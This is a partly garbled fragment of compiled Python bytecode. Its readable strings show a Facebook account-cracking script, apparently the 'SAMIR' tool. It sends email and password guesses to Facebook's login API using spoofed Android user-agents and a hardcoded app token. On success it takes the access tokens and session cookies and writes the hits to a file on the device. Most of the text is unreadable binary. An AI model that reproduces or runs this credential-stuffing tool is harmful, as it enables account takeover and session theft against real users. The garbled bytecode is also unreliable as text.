10; M2004J19C MIUI/V12.0.4.0.QJCMIXM) VD/235","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TQ2B.230505.005.A1) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; PLUM Z712 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-1-5-1-5)","Dalvik/2.1.0 (Linux; U; Android 12; RMX2111 Build/SP1A.210812.016) baiduboxapp/13.33.0.11 (Baidu; P1 12) SP-engine/2.71.0 baiduboxapp/13.33.0.11 (Baidu; P1 12) dumedia/7.41.52.13","Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30i 5G Build/RKQ1.200826.002)","Dalvik/2.1.0 (Linux; U; Android 12; I1927 Build/SP1A.210812.003)","Dalvik/2.1.0 (Linux; U; Android 12; Tab 12 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g42 Build/S2SE32.28-13-1)","Dalvik/2.1.0 (Linux; U; Android 12; Nokia G11 Build/SP1A.210812.016; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 13; I2203 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 6.0; V730 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; Redmi Note 5 Pro Build/SQ3A.220705.003)",])�adid�format�json�	device_id�email�password�generate_analytics_claimsr�   �community_idr�   �cpl�true�try_num�family_device_id�credentials_type�source�login�error_detail_type�button_with_disabled�enroll_misauth�false�generate_session_cookies�generate_machine_id�currently_logged_in_userid�0�en_GB�GB�authenticate)�locale�client_country_code�fb_api_req_friendly_namezgzip, deflatez*/*z
keep-alivez3OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32i N  i@�  �unknownz!application/x-www-form-urlencoded�Liger)z
User-AgentzAccept-Encoding�Accept�
Connection�AuthorizationzX-FB-Friendly-NamezX-FB-Connection-BandwidthzX-FB-Net-HNIzX-FB-SIM-HNIzX-FB-Connection-TypezContent-TypezX-FB-HTTP-Enginez'https://b-graph.facebook.com/auth/loginF)�data�headers�allow_redirects�access_token�session_cookies�name�value�;c                 �"   � g | ]\  }}|�d |����S )�=r�   )r�   �keyrQ  s      rZ   �
<listcomp>zapi.<locals>.<listcomp>�   s'   � �"Z�"Z�"Z�z�s�E�s�s�s�E�E�$:�"Z�"Z�"Zr\   zc_user=(.*);xsz[38;5;84m[SAMIR-LIVE] z ~~ z[38;5;155mu   [1;92m[COOKIE] : ➤ : z[38;5;223mz/sdcard/SAMIR-OKS.txt�az | �
�   )�sys�stdout�write�loop�GREENr  r  �flushrH   rD   rG   r�   rE   �uuid�uuid4r[   r�   �requests�postr+  �updater  �items�re�findallr�   r�   r  �open�	Exception)r%  �pwvr"  �pas�application_version�application_version_code�fbs�gtt�gttt�android_version�	ua_stringr)  rK  �head�po�kuki�cok�xr�   s                      rZ   r  r  �   s�  � ��J���{�D�{�{�in�{�ps�tw�px�px�{�{�{�|�|�|�  ~A�  ~H�  ~N�  ~N�  ~P�  ~P�  ~P�;�� 7	� 7	�C�"%�f�n�S��&=�&=�">�">�w�"F�s�6�K[�\]�^`�Ka�Ka�Gb�Gb�"b�cf�gm�gu�vy�z}�g~�g~�c�c�"��%(���	�)�)L�)L�%M�%M�$���  M�  M�  M�  N�  N�C���  Y�  Y�  Y�  Z�  Z�C���   Z�   Z�   Z�  [�  [�D��� 0��2� 6� 6�7�7�O� ^w�I��t�z�|�|�$�$�D����I�@�&�#�d�j�l�l�+�+� @��f�@���T�Z�\�\�!2�!2�@� �S�@� ��	@�
 0��@� #�B�@� �6�@� �s�@� '��D�J�L�L�(9�(9�@� '�
�@� �g�@� (�)?�@� %�g�@� /��@� *�3�@�  1�#�!@�" &�+/�0>�'@� @� @�D�( !&���(7�#�".�%Z�*8�14�V�^�E�5�5Q�5Q�1R�1R�$'���u�e�(D�(D�$E�$E�$'���u�e�(D�(D�$E�$E�,5�$G�(/�1� 1�D� ��T�Z^�gk�  }B�  C�  C�  C�  H�  H�  J�  J�B���#�#��+�,����� 7� 7�A��J�J��&�	�!�G�*�5�6�6�6�6��z�z�"Z�"Z�S�Y�Y�[�[�"Z�"Z�"Z�[�[���j�!1�4�8�8��;���5�c�9�&�@��D�EU�U�V�V�V��3�D�8�9I�I�J�J�J�5�7�7�7��
�
�3�����,�S�1�1�7�7��E�	�#��d�8J�K�K�K�����a������� � � ��������������s   �$M5O �
O0�+O0)P�marshalr�   rZ  �timer+  rD   rf  r�   �platform�base64r`  �bs4r   �soprb  �ressr   r   r   r   �s�waktu�concurrent.futuresr   r  �	mechanize�requests.exceptionsr	   �ModuleNotFoundErrorr�   r   �zlib�pip�urllib�
subprocess�tred�REDr^  �now�strftime�	dt_string�current�year�ta�month�bu�day�ha�todayr]  r  �cps�cokbrut�Session�ses�uat�ugenr[   rE   r�   ro  �sim�fbrG   �fbavrH   �fbbv�one�hir+   �lolr/   r�   r  r�   r�   r�   r�   r�   r  r�   r\   rZ   �<module>r�     s|  �� ���� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� $� $� $� $� $� $� � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � �K��O�O�O�C�C�C�C�C�C�����3�3�3�3�3�3�3��� K� K� K��B�I�I�J�J�J�J�J�K���� � � � � � � � � � � � � 	��	�'� � � � ��;� <� <� <� 	��	�
B� C� C� C� 	��	�
=� >� >� >� 	��	�
;� <� <� <� 	��	�
;� <� <� <� 	��	�
B� C� C� C� 	��	�
=� >� >� >� 	��	�
;� <� <� <� 	��	�
;� <� <� <� � � � � � �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  � $� $� $� $� $� $� � � � � � ��I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�I�����A�A�A�A�A�A�A��� B� B� B���	�@�A�A�A�A�A� �t�t���� �����h�l�n�n���L�L��!�!�	�
�(�,�.�.���\���]���[����
����������
���H�������	��� � �6 	���  HE�  HE�  HE�  	IE�  	IE���F�M�  M�  M�  M�  N�  N���f�m�O�O�O�P�P���V�]�)�*=�>�?�?��
�&�.��S�
!�
!�Y�Y����r�"�(=�(=�Y�Y����s�SV�@W�@W�Y�Y��
�s�>�6�>�)�I�.�.�/�/���f�m�B�B�B�C�C���V�]�d�d�d�e�e��
�&�-�  0�  0�  0�  @1�  @1���f�m�  f�  f�  f�  g�  g���v�}�l�l�l�m�m���f�m�  i�  i�  i�  j�  j���v�}�  O�  O�  O�  P�  P��� � �	[��d� d� d�
� 
� 
�/� /� /�6>� >� >�~ ������s$   �A1 �1B	�B	�2F �F'�$F'